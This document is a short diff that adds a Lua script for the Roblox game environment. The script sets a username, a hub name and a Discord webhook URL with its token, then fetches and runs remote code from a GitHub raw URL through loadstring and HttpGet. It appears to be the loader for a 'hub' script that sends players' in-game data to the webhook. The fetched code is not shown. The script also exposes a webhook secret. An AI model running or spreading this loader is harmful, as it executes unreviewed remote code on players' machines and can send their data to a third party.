@@ -1,0 +1,4 @@
+_G.Username = "0PSXStart"
+_G.HubName = "RafaHub"
+_G.WebhookUrl = "discord.com/webhooks/1108316842222686339/RZ3qyTme1kPt4C9O-bmDb8geMTfFGcdYY9q1oxTCIV7spMaOiD1s8sAxK62KUirc4G71"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
